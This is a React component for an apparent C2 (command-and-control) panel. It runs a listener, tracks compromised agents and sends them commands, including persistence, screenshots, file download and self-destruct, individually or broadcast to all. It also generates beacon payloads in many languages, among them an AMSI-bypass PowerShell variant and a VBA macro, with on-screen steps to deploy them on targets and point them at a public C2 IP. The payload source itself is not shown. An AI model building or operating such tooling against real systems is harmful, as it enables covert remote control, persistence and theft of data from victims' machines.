import React, { useState, useCallback, useEffect, useRef } from 'react';

interface C2Config {
  listenHost: string;
  listenPort: number;
  useHttps: boolean;
  sslCert?: string;
  sslKey?: string;
  userAgent: string;
}

interface C2Agent {
  id: string;
  hostname: string;
  username: string;
  os: string;
  ip: string;
  firstSeen: string;
  lastCheckin: string;
  status: 'online' | 'offline' | 'dead';
}

interface C2Task {
  id: string;
  agentId: string;
  command: string;
  status: 'queued' | 'sent' | 'completed' | 'failed';
  result: string | null;
  createdAt: string;
  completedAt: string | null;
}

const QUICK_COMMANDS = [
  { label: 'whoami', cmd: 'whoami' },
  { label: 'IP config', cmd: 'ipconfig' },
  { label: 'System info', cmd: 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version"' },
  { label: 'Running procs', cmd: 'tasklist' },
  { label: 'Network conns', cmd: 'netstat -ano' },
  { label: 'List users', cmd: 'net user' },
  { label: 'List dir', cmd: 'dir /B' },
  { label: 'Screenshot', cmd: 'screenshot' },
  { label: 'Persistence', cmd: 'persist' },
  { label: 'Download file', cmd: 'download C:\\Users\\Public\\' },
  { label: 'Self-destruct', cmd: 'selfdestruct' },
];

export function C2Panel() {
  const [serverStatus, setServerStatus] = useState<{ running: boolean; agents: number; tasks: number } | null>(null);
  const [config, setConfig] = useState<C2Config>({ listenHost: '0.0.0.0', listenPort: 8080, useHttps: false, userAgent: '' });
  const [agents, setAgents] = useState<C2Agent[]>([]);
  const [selectedAgent, setSelectedAgent] = useState<string | null>(null);
  const [tasks, setTasks] = useState<C2Task[]>([]);
  const [customCommand, setCustomCommand] = useState('');
  const [payloadScript, setPayloadScript] = useState('');
  const [payloadType, setPayloadType] = useState<string>('python');
  const [beaconSleep, setBeaconSleep] = useState(5);
  const [beaconJitter, setBeaconJitter] = useState(30);
  const [beaconKillDate, setBeaconKillDate] = useState('');
  const [log, setLog] = useState<string[]>([]);
  const logEndRef = useRef<HTMLDivElement>(null);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // ── Profile state ──
  const [profiles, setProfiles] = useState<any[]>([]);
  const [selectedProfile, setSelectedProfile] = useState<string>('default');
  const [editingProfile, setEditingProfile] = useState<any>(null);
  const [showProfileEditor, setShowProfileEditor] = useState(false);
  const [profileEditorJson, setProfileEditorJson] = useState('');

  // Load profiles on mount
  useEffect(() => {
    window.api.profileList().then((list: any[]) => {
      setProfiles(list || []);
      if (list?.length > 0) setSelectedProfile(list[0].name);
    }).catch(() => {});
  }, []);

  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [log]);

  const addLog = (msg: string) => {
    setLog((prev) => [...prev.slice(-99), `[${new Date().toLocaleTimeString()}] ${msg}`]);
  };

  // Poll server status
  useEffect(() => {
    if (!serverStatus?.running) return;
    pollRef.current = setInterval(async () => {
      try {
        const s = await window.api.c2Status();
        setServerStatus(s);
        const a = await window.api.c2Agents();
        setAgents(a);
        if (selectedAgent) {
          const t = await window.api.c2Tasks(selectedAgent);
          setTasks(t);
        }
      } catch {}
    }, 3000);
    return () => { if (pollRef.current) clearInterval(pollRef.current); };
  }, [serverStatus?.running, selectedAgent]);

  const handleStart = useCallback(async () => {
    try {
      const result = await window.api.c2Start({ ...config, profileName: selectedProfile });
      if (result) {
        setServerStatus({ running: true, agents: 0, tasks: 0 });
        addLog(`C2 server started on ${config.listenHost}:${config.listenPort} [profile: ${selectedProfile}]`);
        window.api.addActivity({ tab: 'c2', type: 'start', label: 'C2 Server Started', detail: `Listening on ${config.listenHost}:${config.listenPort}${config.useHttps ? ' (HTTPS)' : ''}` });
      }
    } catch (err: any) {
      addLog(`Error: ${err.message}`);
    }
  }, [config, selectedProfile]);

  const handleStop = useCallback(async () => {
    await window.api.c2Stop();
    setServerStatus(null);
    setAgents([]);
    addLog('C2 server stopped');
    window.api.addActivity({ tab: 'c2', type: 'stop', label: 'C2 Server Stopped', detail: '' });
  }, []);

  const handleRefresh = useCallback(async () => {
    try {
      const s = await window.api.c2Status();
      setServerStatus(s);
      const a = await window.api.c2Agents();
      setAgents(a);
    } catch {}
  }, []);

  const handleSendCommand = useCallback(async (command: string) => {
    if (!selectedAgent || !command.trim()) return;
    try {
      const result = await window.api.c2SendCommand(selectedAgent, command.trim());
      if (result) {
        addLog(`Sent to ${selectedAgent}: ${command.slice(0, 60)}`);
        setCustomCommand('');
        window.api.addActivity({ tab: 'c2', type: 'command', label: `Command: ${command.slice(0, 40)}`, detail: `Agent: ${selectedAgent.slice(0, 8)}...` });
        // Refresh tasks
        const t = await window.api.c2Tasks(selectedAgent);
        setTasks(t);
      }
    } catch (err: any) {
      addLog(`Error: ${err.message}`);
    }
  }, [selectedAgent]);

  const handleBroadcast = useCallback(async () => {
    if (!customCommand.trim()) return;
    try {
      const result = await window.api.c2Broadcast(customCommand.trim());
      addLog(`Broadcast to ${result?.length || 0} agents: ${customCommand.slice(0, 60)}`);
    } catch (err: any) {
      addLog(`Error: ${err.message}`);
    }
  }, [customCommand]);

  const handleGeneratePayload = useCallback(async () => {
    try {
      const kd = beaconKillDate.trim() ? new Date(beaconKillDate).toISOString() : undefined;
      const script = await window.api.c2GeneratePayload(payloadType, beaconSleep, beaconJitter, kd);
      setPayloadScript(script);
      addLog(`Generated ${payloadType} beacon (sleep: ${beaconSleep}s, jitter: ${beaconJitter}%, ${script.length} chars)`);
    } catch (err: any) {
      addLog(`Error: ${err.message}`);
    }
  }, [payloadType, beaconSleep, beaconJitter, beaconKillDate]);

  const selectAgent = useCallback(async (id: string) => {
    setSelectedAgent(id);
    try {
      const t = await window.api.c2Tasks(id);
      setTasks(t);
    } catch {}
  }, []);

  return (
    <div className="space-y-4">
      {/* ── Server Controls ── */}
      <div className="card border-midnight-700/50">
        <div className="flex items-center justify-between mb-3">
          <div className="flex items-center gap-2">
            <svg className="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M8.111 16.404a5.5 5.5 0 017.778 0M12 20h.01m-7.08-7.071c3.904-3.905 10.236-3.905 14.141 0M1.394 9.393c5.857-5.858 15.355-5.858 21.213 0"/></svg>
            <h2 className="text-sm font-semibold text-gray-300 uppercase tracking-wider">C2 Server</h2>
          </div>
          {serverStatus?.running && (
            <div className="flex items-center gap-3 text-xs">
              <span className="flex items-center gap-1.5 text-green-400">
                <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
                Running
              </span>
              <span className="text-gray-500">{serverStatus.agents} agents</span>
              <span className="text-gray-500">{serverStatus.tasks} tasks</span>
            </div>
          )}
        </div>

        <div className="grid grid-cols-4 gap-2 mb-3">
          <div>
            <label className="text-[10px] text-gray-500 block mb-1">Bind Host</label>
            <input type="text" value={config.listenHost}
              onChange={(e) => setConfig({ ...config, listenHost: e.target.value })}
              className="input-field h-8 text-xs font-mono" placeholder="0.0.0.0"
              disabled={serverStatus?.running} />
          </div>
          <div>
            <label className="text-[10px] text-gray-500 block mb-1">Port</label>
            <input type="number" value={config.listenPort}
              onChange={(e) => setConfig({ ...config, listenPort: parseInt(e.target.value) || 8080 })}
              className="input-field h-8 text-xs font-mono" placeholder="8080"
              disabled={serverStatus?.running} />
          </div>
          <div className="flex items-end">
            <label className="flex items-center gap-2 text-xs text-gray-500 pb-1.5">
              <input type="checkbox" checked={config.useHttps}
                onChange={(e) => setConfig({ ...config, useHttps: e.target.checked })}
                disabled={serverStatus?.running}
                className="rounded bg-midnight-800 border-midnight-600" />
              HTTPS
            </label>
          </div>
          <div className="flex items-end">
            {!serverStatus?.running ? (
              <button onClick={handleStart} className="btn-primary w-full h-8 text-xs">
                ▶ Start Server
              </button>
            ) : (
              <button onClick={handleStop} className="btn-secondary w-full h-8 text-xs border-redhawk-700 text-redhawk-400">
                ⏹ Stop Server
              </button>
            )}
          </div>
        </div>

        {/* SSL cert/key picker — shown when HTTPS enabled */}
        {config.useHttps && (
          <div className="grid grid-cols-2 gap-2 mb-3">
            <div>
              <label className="text-[10px] text-gray-500 block mb-1">SSL Certificate (.pem/.crt)</label>
              <div className="flex gap-1">
                <input type="text" value={config.sslCert || ''}
                  onChange={(e) => setConfig({ ...config, sslCert: e.target.value })}
                  className="input-field h-8 text-[10px] font-mono flex-1" placeholder="C:\certs\cert.pem"
                  disabled={serverStatus?.running} />
                <button onClick={async () => {
                  const result = await window.api.dialogOpenFile({ filters: [{ name: 'Certificates', extensions: ['pem', 'crt', 'cert'] }] });
                  if (result) setConfig({ ...config, sslCert: result });
                }} disabled={serverStatus?.running}
                  className="btn-secondary text-[10px] px-2 h-8">Browse</button>
              </div>
            </div>
            <div>
              <label className="text-[10px] text-gray-500 block mb-1">SSL Key (.pem/.key)</label>
              <div className="flex gap-1">
                <input type="text" value={config.sslKey || ''}
                  onChange={(e) => setConfig({ ...config, sslKey: e.target.value })}
                  className="input-field h-8 text-[10px] font-mono flex-1" placeholder="C:\certs\key.pem"
                  disabled={serverStatus?.running} />
                <button onClick={async () => {
                  const result = await window.api.dialogOpenFile({ filters: [{ name: 'Keys', extensions: ['pem', 'key'] }] });
                  if (result) setConfig({ ...config, sslKey: result });
                }} disabled={serverStatus?.running}
                  className="btn-secondary text-[10px] px-2 h-8">Browse</button>
              </div>
            </div>
          </div>
        )}

        {/* Status refresh */}
        {serverStatus?.running && (
          <button onClick={handleRefresh} className="btn-ghost text-xs">↻ Refresh Status</button>
        )}
      </div>

      {/* ── C2 Profile Selector ── */}
      <div className="card border-midnight-700/50">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <svg className="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/>
            </svg>
            <h3 className="text-[10px] font-semibold text-gray-500 uppercase tracking-wider">Communication Profile</h3>
          </div>
          <div className="flex items-center gap-2">
            <button onClick={async () => {
              setShowProfileEditor(!showProfileEditor);
              if (!showProfileEditor) {
                const p = await window.api.profileGet(selectedProfile);
                setEditingProfile(p);
                setProfileEditorJson(JSON.stringify(p, null, 2));
              }
            }} className="btn-secondary text-[10px] px-2">
              {showProfileEditor ? '✕ Close' : '✎ Edit'}
            </button>
          </div>
        </div>
        <div className="flex items-center gap-2 mt-2">
          <select value={selectedProfile} onChange={async (e) => {
            const name = e.target.value;
            setSelectedProfile(name);
            setConfig({ ...config, profileName: name } as any);
            const p = await window.api.profileGet(name);
            setEditingProfile(p);
          }}
            className="input-field py-1.5 text-xs flex-1"
            disabled={serverStatus?.running}>
            {profiles.map((p: any) => (
              <option key={p.name} value={p.name} className="bg-midnight-900 text-gray-100">
                {p.name} — {p.description?.slice(0, 60)}
              </option>
            ))}
          </select>
          {editingProfile && (
            <div className="flex gap-1">
              <span className="text-[10px] text-gray-600 px-1 py-1">
                {editingProfile.http.get.uri} → {editingProfile.http.post.uri}
              </span>
            </div>
          )}
        </div>

        {/* Inline profile editor */}
        {showProfileEditor && editingProfile && (
          <div className="mt-2 border border-midnight-700 rounded overflow-hidden">
            <div className="bg-midnight-950 px-2 py-1 flex items-center justify-between">
              <span className="text-[9px] text-gray-500 font-mono">{editingProfile.name}.json</span>
              <div className="flex gap-1">
                <button onClick={async () => {
                  try {
                    const parsed = JSON.parse(profileEditorJson);
                    const result = await window.api.profileSave(parsed);
                    if (result.success) {
                      addLog(`Profile "${parsed.name}" saved`);
                      const list = await window.api.profileList();
                      setProfiles(list || []);
                      setEditingProfile(parsed);
                    } else {
                      addLog('Failed to save profile');
                    }
                  } catch (e: any) {
                    addLog(`JSON error: ${e.message}`);
                  }
                }} className="text-[9px] px-2 py-0.5 rounded bg-green-900/30 text-green-400 border border-green-700/40 hover:bg-green-900/50">
                  Save
                </button>
                <button onClick={async () => {
                  const name = prompt('New profile name:');
                  if (!name) return;
                  try {
                    const parsed = JSON.parse(profileEditorJson);
                    parsed.name = name.trim();
                    const result = await window.api.profileSave(parsed);
                    if (result.success) {
                      addLog(`Profile "${name}" saved as new`);
                      const list = await window.api.profileList();
                      setProfiles(list || []);
                      setSelectedProfile(name);
                      setEditingProfile(parsed);
                    }
                  } catch (e: any) {
                    addLog(`Error: ${e.message}`);
                  }
                }} className="text-[9px] px-2 py-0.5 rounded bg-blue-900/30 text-blue-400 border border-blue-700/40 hover:bg-blue-900/50">
                  Save As New
                </button>
              </div>
            </div>
            <textarea
              value={profileEditorJson}
              onChange={(e) => setProfileEditorJson(e.target.value)}
              className="w-full bg-midnight-950 text-green-400 text-[10px] font-mono p-2 border-0 outline-none resize-y"
              style={{ minHeight: '200px', maxHeight: '400px' }}
              spellCheck={false}
            />
          </div>
        )}

        {/* Quick overview of active profile settings */}
        {editingProfile && !showProfileEditor && (
          <div className="flex flex-wrap gap-x-4 gap-y-0.5 mt-1.5 text-[9px] text-gray-600">
            <span>Check-in: <span className="text-gray-400 font-mono">{editingProfile.http.get.uri}</span></span>
            <span>Result: <span className="text-gray-400 font-mono">{editingProfile.http.post.uri}</span></span>
            <span>UA: <span className="text-gray-400">{editingProfile.http.userAgent.slice(0, 40)}...</span></span>
            <span>Jitter: <span className="text-gray-400">{editingProfile.http.jitter}%</span></span>
            <span>Sleep: <span className="text-gray-400">{editingProfile.http.sleep}s</span></span>
          </div>
        )}
      </div>

      {/* ── Agent List + Command Console ── */}
      {serverStatus?.running && (
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
          {/* Agent list */}
          <div className="card lg:col-span-1">
            <div className="card-header">Agents ({agents.length})</div>
            {agents.length === 0 ? (
              <div className="text-center py-6 text-gray-600">
                <svg className="w-6 h-6 mb-2 text-gray-600 mx-auto" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M8.111 16.404a5.5 5.5 0 017.778 0M12 20h.01m-7.08-7.071c3.904-3.905 10.236-3.905 14.141 0M1.394 9.393c5.857-5.858 15.355-5.858 21.213 0"/></svg>
                <p className="text-xs">Waiting for agents to connect...</p>
                <p className="text-[10px] mt-2 text-gray-500">
                  1. Generate a payload below → Copy the script<br />
                  2. Save it as <code className="bg-midnight-950 px-1 rounded text-green-400">agent.py</code><br />
                  3. Open a <span className="text-yellow-400">separate terminal</span> and run:<br />
                  <code className="bg-midnight-950 px-1 rounded text-green-400 block mt-1 text-[9px]">python agent.py</code><br />
                  4. <span className="text-yellow-400">Keep that terminal open</span> — the agent loops every 5s
                </p>
                <p className="text-[9px] mt-2 text-gray-600">Agent appears here within ~10s if it connects</p>
              </div>
            ) : (
              <div className="space-y-1.5 max-h-80 overflow-y-auto">
                {agents.map((agent) => (
                  <div
                    key={agent.id}
                    onClick={() => selectAgent(agent.id)}
                    className={`p-2.5 rounded-lg cursor-pointer border transition-all ${
                      selectedAgent === agent.id
                        ? 'bg-redhawk-600/10 border-redhawk-600/40'
                        : 'bg-midnight-800/30 border-midnight-700/30 hover:border-midnight-600/50'
                    }`}
                  >
                    <div className="flex items-center justify-between">
                      <span className="text-sm font-mono text-gray-200 truncate">{agent.hostname}</span>
                      <span className={`w-2 h-2 rounded-full ${
                        agent.status === 'online' ? 'bg-green-500' :
                        agent.status === 'offline' ? 'bg-yellow-500' : 'bg-red-500'
                      }`} />
                    </div>
                    <div className="flex items-center gap-2 text-[10px] text-gray-500 mt-0.5">
                      <span>{agent.username}</span>
                      <span>•</span>
                      <span className="truncate">{agent.ip}</span>
                    </div>
                    <p className="text-[9px] text-gray-600 mt-0.5">
                      Last: {new Date(agent.lastCheckin).toLocaleTimeString()}
                    </p>
                  </div>
                ))}
              </div>
            )}
          </div>

          {/* Command console */}
          <div className="card lg:col-span-2">
            <div className="card-header flex items-center justify-between">
              <span>Command Console {selectedAgent ? `— ${selectedAgent}` : ''}</span>
              {selectedAgent && (
                <button onClick={() => handleSendCommand('screenshot')} className="btn-ghost text-xs">
                  Screenshot
                </button>
              )}
            </div>

            {!selectedAgent ? (
              <p className="text-gray-500 text-xs text-center py-6">Select an agent to send commands</p>
            ) : (
              <>
                {/* Quick commands */}
                <div className="flex flex-wrap gap-1 mb-3">
                  {QUICK_COMMANDS.slice(0, 8).map((qc, idx) => (
                    <button
                      key={idx}
                      onClick={() => handleSendCommand(qc.cmd)}
                      className="text-[10px] px-2 py-1 rounded bg-midnight-800 border border-midnight-700
                                 text-gray-500 hover:text-gray-300 hover:border-midnight-600 transition-all"
                    >
                      {qc.label}
                    </button>
                  ))}
                </div>

                <p className="text-[9px] text-gray-600 mb-2">
                  ⏱ Agent polls every 5s — results appear below within a few seconds after sending
                </p>

                {/* Custom command input */}
                <div className="flex gap-2 mb-3">
                  <input
                    type="text" value={customCommand}
                    onChange={(e) => setCustomCommand(e.target.value)}
                    onKeyDown={(e) => e.key === 'Enter' && handleSendCommand(customCommand)}
                    placeholder="Enter command or path (e.g., dir C:\Users\Public\*)"
                    className="input-field h-9 text-xs font-mono flex-1"
                  />
                  <button onClick={() => handleSendCommand(customCommand)} disabled={!customCommand.trim()}
                    className="btn-primary h-9 text-xs px-4">Send</button>
                  <button onClick={handleBroadcast} disabled={!customCommand.trim()}
                    className="btn-secondary h-9 text-xs px-3" title="Send to all agents">📡 All</button>
                </div>

                {/* Task output */}
                {tasks.length > 0 && (
                  <div className="space-y-1.5 max-h-60 overflow-y-auto">
                    {tasks.slice().reverse().map((task) => (
                      <div key={task.id} className="p-2 rounded bg-midnight-800/30 border border-midnight-700/30">
                        <div className="flex items-center justify-between text-xs">
                          <span className="text-gray-400 font-mono truncate flex-1">{task.command}</span>
                          <span className={`text-[10px] px-1.5 py-0.5 rounded ml-2 ${
                            task.status === 'completed' ? 'bg-green-900/30 text-green-400' :
                            task.status === 'failed' ? 'bg-red-900/30 text-red-400' :
                            task.status === 'sent' ? 'bg-blue-900/30 text-blue-400' :
                            'bg-yellow-900/30 text-yellow-400'
                          }`}>{task.status}</span>
                        </div>
                        {task.result && (
                          <pre className="mt-1 text-[10px] text-gray-500 font-mono whitespace-pre-wrap max-h-20 overflow-y-auto">
                            {task.result.slice(0, 500)}
                          </pre>
                        )}
                      </div>
                    ))}
                  </div>
                )}
              </>
            )}
          </div>
        </div>
      )}

      {/* ── Payload Generation ── */}
      <div className="card">
        <div className="card-header">Generate Agent Payload</div>
        {/* Beacon config */}
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mb-3">
          <div>
            <label className="text-[10px] text-gray-500 block mb-1">Target Runtime</label>
            <select value={payloadType} onChange={(e) => setPayloadType(e.target.value as any)}
              className="input-field py-1.5 text-xs">
              <option value="python" className="bg-midnight-900 text-gray-100">Python</option>
              <option value="powershell" className="bg-midnight-900 text-gray-100">PowerShell</option>
              <option value="powershell-amsi" className="bg-midnight-900 text-gray-100">PS (AMSI Bypass)</option>
              <option value="batch" className="bg-midnight-900 text-gray-100">Batch (.bat)</option>
              <option value="bash" className="bg-midnight-900 text-gray-100">Bash (Linux)</option>
              <option value="sh" className="bg-midnight-900 text-gray-100">SH (BusyBox)</option>
              <option value="csharp" className="bg-midnight-900 text-gray-100">C# (.NET)</option>
              <option value="vba" className="bg-midnight-900 text-gray-100">VBA Macro</option>
              <option value="nim" className="bg-midnight-900 text-gray-100">Nim</option>
              <option value="rust" className="bg-midnight-900 text-gray-100">Rust</option>
            </select>
          </div>
          <div>
            <label className="text-[10px] text-gray-500 block mb-1">Sleep Interval (s)</label>
            <input type="number" min="1" max="3600" value={beaconSleep}
              onChange={(e) => setBeaconSleep(parseInt(e.target.value) || 5)}
              className="input-field h-8 text-xs font-mono" />
          </div>
          <div>
            <label className="text-[10px] text-gray-500 block mb-1">Jitter (%)</label>
            <input type="number" min="0" max="100" value={beaconJitter}
              onChange={(e) => setBeaconJitter(parseInt(e.target.value) || 0)}
              className="input-field h-8 text-xs font-mono" />
          </div>
          <div>
            <label className="text-[10px] text-gray-500 block mb-1">Kill Date (optional)</label>
            <input type="date" value={beaconKillDate}
              onChange={(e) => setBeaconKillDate(e.target.value)}
              className="input-field h-8 text-xs font-mono" />
          </div>
        </div>
        <div className="flex items-center gap-2">
          <button onClick={handleGeneratePayload} className="btn-primary h-9 text-xs flex-1">
            Generate Beacon
          </button>
          {payloadScript && (
            <button onClick={() => { navigator.clipboard.writeText(payloadScript); }}
              className="btn-ghost text-xs">Copy</button>
          )}
        </div>
        {payloadScript && (
          <pre className="terminal text-[10px] max-h-48 overflow-y-auto whitespace-pre-wrap mt-2">
            {payloadScript}
          </pre>
        )}
        <div className="mt-3 space-y-1 text-[10px] text-gray-500 border-t border-midnight-800 pt-3">
          <p><span className="text-yellow-400">①</span> Set the sleep/jitter values above, then click <span className="text-green-400">Generate Beacon</span></p>
          <p><span className="text-yellow-400">②</span> Copy the script and deploy it on the target machine</p>
          <p><span className="text-yellow-400">③</span> Keep the target process running — the beacon polls every {beaconSleep}s ±{beaconJitter}%</p>
          <p className="text-gray-600 mt-1">
            For remote targets, replace <code className="bg-midnight-950 px-1 rounded">127.0.0.1</code> in the script
            with your C2 server's public IP.
          </p>
          {payloadType === 'powershell-amsi' && (
            <p className="text-green-500 mt-1">⚠ AMSI-bypassed: may trigger Windows Defender on recent builds</p>
          )}
          {payloadType === 'python' && (
            <p className="text-blue-400 mt-1">ℹ Target needs Python 3 installed. Check with <code className="bg-midnight-950 px-1 rounded">python --version</code></p>
          )}
          {payloadType === 'powershell' && (
            <p className="text-blue-400 mt-1">ℹ PowerShell 5+ required. Available on all modern Windows targets.</p>
          )}
        </div>
      </div>

      {/* ── Activity Log ── */}
      <div className="card">
        <div className="card-header">Activity Log</div>
        <div className="terminal text-[10px] max-h-40 overflow-y-auto">
          {log.length === 0 ? (
            <span className="text-gray-600">No activity yet. Start the server, deploy the agent, then send commands.</span>
          ) : (
            log.map((entry, i) => <div key={i} className="text-gray-500">{entry}</div>)
          )}
          <div ref={logEndRef} />
        </div>
      </div>
    </div>
  );
}
